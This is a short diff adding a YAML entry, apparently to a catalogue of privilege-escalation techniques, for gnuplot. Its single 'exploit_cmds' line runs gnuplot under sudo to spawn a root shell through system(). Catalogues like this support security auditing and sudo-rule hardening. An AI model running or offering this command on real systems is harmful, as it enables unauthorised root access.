@@ -1,0 +1,4 @@
+name: gnuplot
+binary_path: /usr/bin/gnuplot
+exploit_cmds:
+- sudo /usr/bin/gnuplot -e 'system("/bin/sh 1>&0")'
